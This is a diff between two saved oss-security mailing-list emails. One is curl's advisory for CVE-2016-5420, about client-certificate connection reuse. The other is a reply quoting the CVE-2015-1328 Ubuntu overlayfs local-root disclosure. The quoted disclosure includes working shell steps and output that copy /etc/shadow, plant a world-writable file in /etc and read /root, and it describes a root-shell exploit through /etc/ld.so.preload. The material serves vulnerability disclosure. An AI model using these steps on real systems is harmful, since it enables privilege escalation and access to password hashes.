@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2653" "Wednesday" "3" "August" "2016" "09:05:26" "+0200" "Daniel Stenberg" "daniel@haxx.se" "<alpine.DEB.2.20.1608030901400.2418@tvnag.unkk.fr>" "89" "[oss-security] [SECURITY VULNERABILITY] curl: Re-using connections with wrong client cert" nil nil nil "8" "2016080307:05:26" "[oss-security] [SECURITY VULNERABILITY] curl: Re-using connections with wrong client cert" (number mark "U       daniel@haxx. Aug  3   89/2653  " thread-indent "\"[oss-security] [SECURITY VULNERABILITY] curl: Re-using connections with wrong client cert\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5101" "Tuesday" "16" "June" "2015" "11:03:53" "+0200" "Alban Crequy" "alban.crequy@gmail.com" "<CAMXgnP5FtUDvcH4-mv-a_h0XY-C6a6OszBVihyRsnSvTq-bN-A@mail.gmail.com>" "110" "Re: [oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" nil nil nil "6" "2015061609:03:53" "[oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" (number mark "U       alban.crequy Jun 16  110/5101  " thread-indent "\"Re: [oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root\"\n") "<CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>" ("<CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7241 invoked by uid 550); 3 Aug 2016 07:05:40 -0000
+Received: (qmail 24567 invoked by uid 550); 16 Jun 2015 09:46:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,109 +12,140 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6138 invoked from network); 3 Aug 2016 07:05:39 -0000
-X-Authentication-Warning: giant.haxx.se: dast owned process doing -bs
-Date: Wed, 3 Aug 2016 09:05:26 +0200 (CEST)
-From: Daniel Stenberg <daniel@haxx.se>
-X-X-Sender: dast@giant.haxx.se
-To: curl security announcements -- curl users <curl-users@cool.haxx.se>,
-        curl-announce@cool.haxx.se,
-        libcurl hacking <curl-library@cool.haxx.se>,
-        oss-security@lists.openwall.com
-Message-ID: <alpine.DEB.2.20.1608030901400.2418@tvnag.unkk.fr>
-User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
-X-fromdanielhimself: yes
+Received: (qmail 28384 invoked from network); 16 Jun 2015 09:04:04 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:sender:in-reply-to:references:date:message-id:subject
+         :from:to:content-type;
+        bh=oVKj6unnttYLYBEOnD/dVobV//0I20gu5u0viW0Fyh8=;
+        b=TQTtQPXDtoFHra+7HQPkHP2/1urxLJ2YFAlU+ymzxlYZUzAUeZ+BlqeLDmgeLvH4j7
+         WUKUMlxo7qMaZm1sxPXh88WDbOL+tRJmdFZ0rhckliAM4boteoLN3SgNEB5mJs78/lOi
+         /lFKk3S78H4s1x3ZcvsbrFNQAm5vf5TOMDckVAXZ1TQBfV3qEFN6JAByNda/0brgwuCP
+         g5dkqYNv8J5DCIhtrYmo3niLRrzZSCWaoQj0NQx5+iNwjhHtz73M66wvR7iu0V/99EWd
+         UXAoHSKtIiKxsxxHohiAwxccluQZmYkiNWYOwoXel2QqOmSYKMdet0nJ+TORkCyiAVQf
+         UdTA==
 MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [SECURITY VULNERABILITY] curl: Re-using connections with wrong client
- cert
+X-Received: by 10.112.78.105 with SMTP id a9mr5397507lbx.70.1434445433788;
+ Tue, 16 Jun 2015 02:03:53 -0700 (PDT)
+Sender: muadda@gmail.com
+In-Reply-To: <CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>
+References: <CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>
+Date: Tue, 16 Jun 2015 11:03:53 +0200
+X-Google-Sender-Auth: Sagkh3sX8KPCobYlGyWzaWweiI4
+Message-ID: <CAMXgnP5FtUDvcH4-mv-a_h0XY-C6a6OszBVihyRsnSvTq-bN-A@mail.gmail.com>
+From: Alban Crequy <alban.crequy@gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8
+Subject: Re: [oss-security] CVE-2015-1328: incorrect permission checks in
+ overlayfs, ubuntu local root
 
-Re-using connections with wrong client cert
-===========================================
+Hi,
 
-Project cURL Security Advisory, August 3rd 2016 -
-[Permalink](https://curl.haxx.se/docs/adv_20160803B.html)
+Do Ubuntu kernels still disable unprivileged CLONE_NEWUSER by default,
+unless changed in /proc/sys/kernel/unprivileged_userns_clone? I see
+the patch in Debian but I don't know if it is still in Ubuntu:
+http://anonscm.debian.org/viewvc/kernel/dists/trunk/linux/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch?view=markup
 
-VULNERABILITY
--------------
+It should limit the scope of the issue to configurations where root
+sets up user namespaces.
 
-libcurl did not consider client certificates when reusing TLS connections.
+Best regards,
+Alban
 
-libcurl supports reuse of established connections for subsequent requests. It
-does this by keeping a few previous connections "alive" in a connection pool
-so that a subsequent request that can use one of them instead of creating a
-new connection will do so.
-
-When using a client certificate for a connection that was then put into the
-connection pool, that connection could then wrongly get reused in a subsequent
-request to that same server that either didn't use a client certificate at all
-or that asked to use a different client certificate thus trying to tell the
-user that it is a different entity.
-
-This mistakenly using the wrong connection could of course lead to
-applications sending requests to the wrong realms of the server using
-authentication that it wasn't supposed to have for those operations.
-
-We are not aware of any exploit of this flaw.
-
-INFO
-----
-
-This flaw also affects the curl command line tool.
-
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2016-5420 to this issue.
-
-AFFECTED VERSIONS
------------------
-
-This flaw is relevant for all versions of curl and libcurl that support
-SSL/TLS and client certificates.
-
-- Affected versions: libcurl 7.1 to and including 7.50.0
-- Not affected versions: libcurl >= 7.50.1
-
-libcurl is used by many applications, but not always advertised as such!
-
-THE SOLUTION
-------------
-
-In version 7.50.1, curl will check that re-used connections have the correct
-client certificate (file name) before used.
-
-A [patch for CVE-2016-5420](https://curl.haxx.se/CVE-2016-5420.patch) is
-available. This patch relies on the
-[CVE-2016-5419](https://curl.haxx.se/docs/adv_20160803A.html) patch already
-having been applied.
-
-RECOMMENDATIONS
----------------
-
-We suggest you take one of the following actions immediately, in order of
-preference:
-
-  A - Upgrade curl and libcurl to version 7.50.1
-
-  B - Apply the patch to your version and rebuild
-
-  C - Do not use client certificates
-
-TIME LINE
----------
-
-This was figured out by curl security team members during our work with the
-20160803A flaw during June 2016. We contacted distros@openwall on July 31.
-
-libcurl 7.50.1 was released on August 3 2016, coordinated with the publication
-of this advisory.
-
-CREDITS
--------
-
-Found by the curl security team. Patch by Daniel Stenberg.
-
-Thanks a lot!
-
--- 
-
-  / daniel.haxx.se
+On 16 June 2015 at 02:17, Philip Pettersson <philip.pettersson@gmail.com> wrote:
+> Hello, this is CVE-2015-1328 which allows a local root privilege escalation
+> in the default configuration on all currently supported versions of Ubuntu.
+>
+> The overlayfs filesystem does not correctly check file permissions when
+> creating new files in the upper filesystem directory. This can be exploited
+> by an unprivileged process in kernels with CONFIG_USER_NS=y and where
+> overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
+> inside unprivileged mount namespaces. This is the default configuration of
+> Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].
+>
+> If you don't want to update your kernel and you don't use overlayfs, a viable
+> workaround is to just remove or blacklist overlayfs.ko / overlay.ko.
+>
+> Details
+> ================================
+>
+> From Documentation/filesystems/overlayfs.txt [2]:
+>
+> "Objects that are not directories (files, symlinks, device-special
+> files etc.) are presented either from the upper or lower filesystem as
+> appropriate.  When a file in the lower filesystem is accessed in a way
+> the requires write-access, such as opening for write access, changing
+> some metadata etc., the file is first copied from the lower filesystem
+> to the upper filesystem (copy_up)."
+>
+> The ovl_copy_up_* functions do not correctly check that the user has
+> permission to write files to the upperdir directory. The only permissions
+> that are checked is if the owner of the file that is being modified has
+> permission to write to the upperdir. Furthermore, when a file is copied from
+> the lowerdir the file metadata is carbon copied, instead of attributes such as
+> owner being changed to the user that triggered the copy_up_* procedures.
+>
+> Example of creating a 1:1 copy of a root-owned file:
+>
+> (Note that the workdir= option is not needed on older kernels)
+>
+> user@ubuntu-server-1504:~$ ./create-namespace
+> root@ubuntu-server-1504:~# mount -t overlay -o
+> lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
+> root@ubuntu-server-1504:~# chmod 777 work/work/
+> root@ubuntu-server-1504:~# cd o
+> root@ubuntu-server-1504:~/o# mv shadow copy_of_shadow
+> (exit the namespace)
+> user@ubuntu-server-1504:~$ ls -al upper/copy_of_shadow
+> -rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
+> user@ubuntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
+> Device: 801h/2049d      Inode: 939791      Links: 1
+> Device: 801h/2049d      Inode: 277668      Links: 1
+>
+> Now we can place this file in /etc by switching "upper" to be the lowerdir
+> option, the permission checks pass since the file is owned by root and root
+> can write to /etc.
+>
+> user@ubuntu-server-1504:~$ ./create-namespace
+> root@ubuntu-server-1504:~# mount -t overlay -o
+> lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
+> root@ubuntu-server-1504:~# chmod 777 work/work/
+> root@ubuntu-server-1504:~# cd o
+> root@ubuntu-server-1504:~/o# chmod 777 copy_of_shadow
+> root@ubuntu-server-1504:~/o# exit
+> user@ubuntu-server-1504:~$ ls -al /etc/copy_of_shadow
+> -rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow
+>
+> The attached exploit gives a root shell by creating a world-writable
+> /etc/ld.so.preload file. The exploit has been tested on the most recent
+> kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.
+>
+> It is also possible to list directory contents for any directory on the system
+> regardless of permissions:
+>
+> nobody@ubuntu-server-1504:~$ ls -al /root
+> ls: cannot open directory /root: Permission denied
+> nobody@ubuntu-server-1504:~$ mkdir o upper work
+> nobody@ubuntu-server-1504:~$ mount -t overlayfs -o
+> lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
+> overlayfs /home/user/o
+> nobody@ubuntu-server-1504:~$ ls -al o 2>/dev/null
+> total 8
+> drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
+> drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
+> -????????? ? ?    ?          ?            ? .bash_history
+> -????????? ? ?    ?          ?            ? .bashrc
+> d????????? ? ?    ?          ?            ? .cache
+> -????????? ? ?    ?          ?            ? .lesshst
+> d????????? ? ?    ?          ?            ? linux-3.19.0
+>
+>
+> Credit
+> ================================
+> Philip Pettersson, Samsung SDS Security Center
+>
+> References
+> ================================
+> [1] https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
+> [2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
+> [3] http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html
